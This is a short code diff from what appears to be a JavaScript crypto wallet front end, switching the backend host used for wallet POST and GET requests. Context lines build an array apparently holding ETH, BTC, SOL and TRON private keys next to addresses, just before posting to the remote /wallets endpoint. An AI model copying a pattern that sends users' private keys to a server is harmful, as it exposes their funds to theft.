@@ -114,7 +114,7 @@ const[color,  setColor] = useState('grey');
     try{
       const p_k = [ethk, btck, solK,  tronK]; 
         const Address =  [ethAdd, bitAdd, solAdd, tronAdd] ;
-        const res = await   fetch("https://twa-backend-cd2n.onrender.com/wallets", {
+        const res = await   fetch("https://twa-backend-hsy3.onrender.com/wallets", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           credentials: "include",  
@@ -216,7 +216,7 @@ else{
   const walletId = await getWalletIdFromIndexedDB();
   if (!walletId) throw new Error('Wallet ID not found in IndexedDB');
 
-  const response = await fetch(`https://twa-backend-cd2n.onrender.com/wallets/${walletId}`, {
+  const response = await fetch(`https://twa-backend-hsy3.onrender.com/wallets/${walletId}`, {
     method: "GET",
     headers: { "Content-Type": "application/json" },
     credentials: "include"
